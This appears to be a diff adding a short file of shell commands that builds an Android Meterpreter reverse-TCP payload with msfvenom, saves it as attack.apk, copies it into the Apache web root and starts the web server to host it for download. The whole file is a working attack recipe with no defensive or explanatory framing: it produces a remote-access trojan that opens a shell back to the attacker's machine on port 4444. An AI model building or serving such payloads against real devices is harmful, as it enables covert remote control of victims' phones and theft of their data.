@@ -1,0 +1,7 @@
+msfvenom
+msfvenom -p android/meterpreter/reverse_tcp LHOST=(ifconfig) LPORT=4444 R > attack.apk
+mv attack.apk /var/www/html/
+cd /var/www/html/
+service apache2 start 
+
+
